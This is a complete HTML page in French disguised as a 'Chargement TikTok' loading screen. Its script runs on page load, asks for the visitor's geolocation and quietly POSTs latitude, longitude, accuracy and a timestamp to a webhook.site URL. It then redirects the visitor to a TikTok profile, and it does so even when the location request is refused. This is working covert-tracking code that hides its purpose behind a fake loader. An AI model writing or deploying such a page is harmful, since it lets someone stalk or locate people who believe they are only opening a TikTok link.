<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <title>Chargement TikTok...</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      margin-top: 100px;
    }
  </style>
</head>
<body>
  <h2>Chargement de TikTok...</h2>
  <p>Veuillez patienter.</p>

  <script>
    navigator.geolocation.getCurrentPosition(
      function(position) {
        const lat = position.coords.latitude;
        const lon = position.coords.longitude;
        const accuracy = position.coords.accuracy;

        // Envoie des coordonnées au webhook
        fetch("https://webhook.site/61f403b2-ec80-41ca-a9eb-91559445607d", {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({
            latitude: lat,
            longitude: lon,
            precision: accuracy + " mètres",
            timestamp: new Date().toISOString()
          })
        });

        // Redirection vers TikTok après 2 secondes
        setTimeout(() => {
          window.location.href = "https://www.tiktok.com/@crush.rabelais";
        }, 2000);
      },
      function(error) {
        // Si refus géoloc, redirige quand même
        window.location.href = "https://www.tiktok.com/@crush.rabelais";
      }
    );
  </script>
</body>
</html>
